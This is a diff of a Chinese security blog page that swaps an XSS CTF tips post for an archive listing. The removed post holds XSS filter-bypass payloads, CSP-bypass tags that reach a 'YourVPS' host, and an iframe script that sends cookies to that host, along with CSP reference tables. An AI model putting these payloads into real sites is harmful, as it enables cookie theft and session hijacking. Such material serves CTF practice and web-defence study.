@@ -6,19 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://www.wzsite.cn">
-  <title>XSS题技巧总结-不定期更新 | Wz&#39;s Blog</title>
+  <title>Archives: 2017/11 | Wz&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="keywords" content="CTF,XSS,WEB">
-<meta property="og:type" content="article">
-<meta property="og:title" content="XSS题技巧总结-不定期更新">
-<meta property="og:url" content="https://www.wzsite.cn/2017/09/28/XSS题技巧总结-不定期更新/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Wz&#39;s Blog">
+<meta property="og:url" content="https://www.wzsite.cn/archives/2017/11/index.html">
 <meta property="og:site_name" content="Wz&#39;s Blog">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/28/XSS题技巧总结-不定期更新/5-29.jpg">
-<meta property="og:updated_time" content="2017-09-28T15:41:15.518Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XSS题技巧总结-不定期更新">
-<meta name="twitter:image" content="https://www.wzsite.cn/2017/09/28/XSS题技巧总结-不定期更新/5-29.jpg">
+<meta name="twitter:title" content="Wz&#39;s Blog">
   
     <link rel="alternative" href="/atom.xml" title="Wz&#39;s Blog" type="application/atom+xml">
   
@@ -160,265 +156,36 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-XSS题技巧总结-不定期更新" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      XSS题技巧总结-不定期更新
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2017" class="archive-year">2017</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2017/11/10/2017-看雪CTF秋季赛-第二题/" class="archive-article-date">
+  	<time datetime="2017-11-10T11:21:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-10</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2017/11/10/2017-看雪CTF秋季赛-第二题/">2017-看雪CTF秋季赛-第二题</a>
     </h1>
   
 
-        
-        <a href="/2017/09/28/XSS题技巧总结-不定期更新/" class="archive-article-date">
-  	<time datetime="2017-09-28T11:59:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <img src="/2017/09/28/XSS题技巧总结-不定期更新/5-29.jpg" alt="5-29.jpg" title="">
-<a id="more"></a>
-<h1 id="一般绕过"><a href="#一般绕过" class="headerlink" title="一般绕过"></a>一般绕过</h1><p>1、检测 alert :<br>如 preg_match(“\alert\i”,$var);<br>Bypass:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>，<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">41</span>))</div></pre></td></tr></table></figure></p>
-<p>2、检测 script:<br>如 preg_match(“\script\i”,$var);<br>Bypass:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=<span class="string">""</span> onerror=<span class="string">"alert(1)"</span>&gt;</div></pre></td></tr></table></figure></p>
-<p>3、用preg_macth()检测可以用数组传参绕过</p>
-<h1 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h1><h2 id="CSP-Content-Security-Policy-内容安全策略"><a href="#CSP-Content-Security-Policy-内容安全策略" class="headerlink" title="CSP(Content Security Policy)内容安全策略"></a>CSP(Content Security Policy)内容安全策略</h2><p><strong><em>科普在后面</em></strong></p>
-<h4 id="同源策略-default-src-”self”"><a href="#同源策略-default-src-”self”" class="headerlink" title="同源策略 default-src:”self”"></a>同源策略 default-src:”self”</h4><p><strong>谷歌</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=<span class="string">"refresh"</span> content=<span class="string">"0;url=http://YourVPS"</span>&gt;  </div><div class="line">&lt;link rel=<span class="string">"prerender"</span> href=<span class="string">"http://YourVPS"</span>&gt;</div></pre></td></tr></table></figure></p>
-<p><strong>火狐</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=<span class="string">"refresh"</span> content=<span class="string">"0;url=http://YourVPS"</span>&gt;  </div><div class="line">&lt;link rel=<span class="string">"prefetch"</span> href=<span class="string">"http://YourVPS"</span>&gt;</div></pre></td></tr></table></figure></p>
-<blockquote>
-<p>meta标签的http-equiv=”refresh”</p>
-<ul>
-<li>刷新、跳转页面</li>
-</ul>
-<p>content中的0</p>
-<ul>
-<li>多少秒跳转</li>
-</ul>
-<p>link标签的 rel=”prefetch”</p>
-<ul>
-<li>预缓存</li>
-</ul>
-</blockquote>
-<h4 id="利用iframe获取同域cookie"><a href="#利用iframe获取同域cookie" class="headerlink" title="利用iframe获取同域cookie"></a>利用iframe获取同域cookie</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	<span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</div><div class="line">	iframe.name=<span class="string">"Testzero"</span>;</div><div class="line">	iframe.src=<span class="string">"同域站点"</span><span class="comment">//敏感目录</span></div><div class="line">	<span class="built_in">document</span>.body.appendChild(iframe);</div><div class="line">	location.href=<span class="string">"http://YourVPS?cookie="</span>+<span class="built_in">escape</span>(Testzero.window.document.cookie);</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>
-<h3 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h3><blockquote>
-<ul>
-<li>Content-Security-Policy： 策略内的进行规定的进行相应的阻止</li>
-<li>Content-Security-Policy-Report-Only： 只报告不阻止</li>
-</ul>
-</blockquote>
-<h3 id="键说明"><a href="#键说明" class="headerlink" title="键说明"></a>键说明</h3><table>
-<thead>
-<tr>
-<th>Key</th>
-<th>取值示例</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>default-src</td>
-<td>‘self’ xxx.example.com</td>
-<td>定义针对所有类型（js/image/css/web font/ajax/iframe/多媒体等）资源的默认加载策略，某类型资源如果没有单独定义策略，就使用默认。</td>
-<td></td>
-</tr>
-<tr>
-<td>script-src</td>
-<td>‘self’ js.example.com</td>
-<td>定义针对JavaScript的加载策略</td>
-<td></td>
-</tr>
-<tr>
-<td>object-src</td>
-<td>‘self’</td>
-<td>针对,, 等标签的加载策略</td>
-<td></td>
-</tr>
-<tr>
-<td>style-src</td>
-<td>‘self’ css.example.com</td>
-<td>定义针对样式的加载策略</td>
-<td></td>
-</tr>
-<tr>
-<td>img-src</td>
-<td>‘self’ image.example.com</td>
-<td>定义针对图片的加载策略</td>
-<td></td>
-</tr>
-<tr>
-<td>media-src</td>
-<td>‘media.example.com’</td>
-<td>针对或者引入的html多媒体等标签的加载策略</td>
-<td></td>
-</tr>
-<tr>
-<td>frame-src</td>
-<td>‘self’</td>
-<td>针对iframe的加载策略</td>
-<td></td>
-</tr>
-<tr>
-<td>connect-src</td>
-<td>‘self’</td>
-<td>针对Ajax、WebSocket等请求的加载策略。不允许的情况下，浏览器会模拟一个状态为400的响应</td>
-<td></td>
-</tr>
-<tr>
-<td>font-src</td>
-<td>font.qq.com</td>
-<td>针对Web Font的加载策略</td>
-<td></td>
-</tr>
-<tr>
-<td>sandbox</td>
-<td>allow-forms allow-scripts</td>
-<td>对请求的资源启用sandbox</td>
-<td></td>
-</tr>
-<tr>
-<td>report-uri</td>
-<td>/some-report-uri</td>
-<td>告诉浏览器如果请求的资源不被策略允许时，往哪个地址提交日志信息。不阻止任何内容，可以改用Content-Security-Policy-Report-Only头</td>
-<td></td>
-</tr>
-<tr>
-<td>base-uri</td>
-<td>‘self’</td>
-<td>限制当前页面的url（CSP2）</td>
-<td></td>
-</tr>
-<tr>
-<td>child-src</td>
-<td>‘self’</td>
-<td>限制子窗口的源(iframe、弹窗等),取代frame-src（CSP2）</td>
-<td></td>
-</tr>
-<tr>
-<td>form-action</td>
-<td>‘self’</td>
-<td>限制表单能够提交到的源（CSP2）</td>
-<td></td>
-</tr>
-<tr>
-<td>frame-ancestors</td>
-<td>‘none’</td>
-<td>限制了当前页面可以被哪些页面以iframe,frame,object等方式加载（CSP2）</td>
-<td></td>
-</tr>
-<tr>
-<td>plugin-types</td>
-<td>application/pdf</td>
-<td>限制插件的类型（CSP2）</td>
-<td></td>
-</tr>
-</tbody>
-</table>
-<h3 id="值说明"><a href="#值说明" class="headerlink" title="值说明"></a>值说明</h3><table>
-<thead>
-<tr>
-<th>Value</th>
-<th>示例</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>*</td>
-<td>img-src *</td>
-<td>允许任何内容</td>
-<td></td>
-</tr>
-<tr>
-<td>‘none’</td>
-<td>img-src ‘none’</td>
-<td>不允许任何内容</td>
-<td></td>
-</tr>
-<tr>
-<td>‘self’</td>
-<td>img-src ‘self’</td>
-<td>允许同源内容</td>
-<td></td>
-</tr>
-<tr>
-<td>data:</td>
-<td>img-src data:</td>
-<td>允许data:协议（如base64编码的图片）</td>
-<td></td>
-</tr>
-<tr>
-<td>www.a.com</td>
-<td>img-src www.a.com</td>
-<td>允许加载指定域名的资源</td>
-<td></td>
-</tr>
-<tr>
-<td>*.a.com</td>
-<td>img-src *.a.com</td>
-<td>允许加载a.com任何子域的资源</td>
-<td></td>
-</tr>
-<tr>
-<td><a href="https://img.com" target="_blank" rel="external">https://img.com</a></td>
-<td>img-src<a href="https://img.com" target="_blank" rel="external">https://img.com</a></td>
-<td>允许加载img.com的https资源</td>
-<td></td>
-</tr>
-<tr>
-<td>https:</td>
-<td>img-src https:</td>
-<td>允许加载https资源</td>
-<td></td>
-</tr>
-<tr>
-<td>‘unsafe-inline’</td>
-<td>script-src ‘unsafe-inline’</td>
-<td>允许加载inline资源（style属性，onclick，inline js和inline css等等）</td>
-<td></td>
-</tr>
-<tr>
-<td>‘unsafe-eval’</td>
-<td>script-src ‘unsafe-eval’</td>
-<td>允许加载动态js代码，例如eval()</td>
-<td></td>
-</tr>
-</tbody>
-</table>
-<blockquote>
-<p>以上表格引用自<a href="http://web.jobbole.com/86409/" target="_blank" rel="external">伯乐在线</a></p>
-</blockquote>
-
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -428,17 +195,13 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XSS</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">WEB</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">二进制</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -451,126 +214,17 @@
 	</div>
 
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=https://www.wzsite.cn/2017/09/28/XSS题技巧总结-不定期更新/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2017/09/29/滴滴实习生面经/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          滴滴实习生面经
-        
-      </div>
-    </a>
   
   
-    <a href="/2017/09/27/Pwnable-kr-Passcode/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Pwnable.kr--Passcode</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-        <div class="toc-container tooltip-left">
-            <i class="icon-font icon-category"></i>
-            <div class="tooltip tooltip-east">
-                <span class="tooltip-item">
-                </span>
-                <span class="tooltip-content">
-                    <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#一般绕过"><span class="toc-number">1.</span> <span class="toc-text">一般绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSP绕过"><span class="toc-number">2.</span> <span class="toc-text">CSP绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP-Content-Security-Policy-内容安全策略"><span class="toc-number">2.1.</span> <span class="toc-text">CSP(Content Security Policy)内容安全策略</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#同源策略-default-src-”self”"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">同源策略 default-src:”self”</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用iframe获取同域cookie"><span class="toc-number">2.1.0.2.</span> <span class="toc-text">利用iframe获取同域cookie</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#用法："><span class="toc-number">2.1.1.</span> <span class="toc-text">用法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#键说明"><span class="toc-number">2.1.2.</span> <span class="toc-text">键说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#值说明"><span class="toc-number">2.1.3.</span> <span class="toc-text">值说明</span></a></li></ol></li></ol></li></ol>
-                    </div>
-                </span>
-            </div>
-        </div>
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
-
-  
-
-  
+    
 
 
           </div>
@@ -593,8 +247,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
-		isArchive: false,
+		isPost: false,
+		isArchive: true,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
